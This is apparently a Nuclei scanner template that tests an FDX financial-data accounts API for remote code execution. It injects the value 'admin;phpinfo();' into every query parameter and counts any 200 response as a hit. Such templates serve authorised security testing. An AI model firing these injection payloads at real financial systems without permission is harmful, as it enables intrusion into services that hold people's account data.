id: FDX-API-Security-Tests-RCE

info:
  name: FDX API Tests RCE
  author: 0x240x23elu & OFJAAAH & vtobi
  severity: critical
  description: |
    FDX API Remote Code Execution Tests.
  reference:
    - https://www.financialdataexchange.org/FDX/FDX/News/Press-Releases/Financial_Data_Exchange_Releases_FDX_API_5.0.aspx
  tags: fdx


requests:
  - raw:
      - |
        GET /fdx/v4/accounts?accountIds=§rce§&startTime=§rce§&endTime=§rce§&resultType=lightweight&offset=§rce§&limit=§rce§ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{JWT}} 
        Connection: keep-alive
    payloads:
      rce:
         - "admin;phpinfo();"
    attack: batteringram

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        part: header
        status:
          - 200
